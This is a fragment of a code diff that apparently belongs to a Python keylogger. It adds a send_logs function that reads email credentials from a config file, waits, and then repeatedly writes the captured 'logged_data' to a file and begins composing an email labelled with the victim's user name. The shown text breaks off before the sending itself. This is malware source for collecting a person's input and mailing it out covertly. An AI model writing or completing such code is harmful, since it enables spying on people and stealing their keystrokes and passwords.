@@ -73,3 +73,21 @@ def write_file(count):
 	with open(file,'w') as fp:
 		fp.write(''.join(logged_data))
 	print('written all good')
+
+def send_logs():
+	count = 0
+
+	fromAddr = config.fromAddr
+	fromPswd = config.fromPswd
+	toAddr = fromAddr
+
+	MIN = 10
+	SECONDS = 60
+	#time.sleep(MIN * SECONDS) # every 10 mins write file/send log
+	time.sleep(30) # for debugging ~ yes program works :)
+	while True:
+		if len(logged_data) > 1:
+			try:
+				write_file(count)
+
+				subject = f'[{user}] ~ {count}'
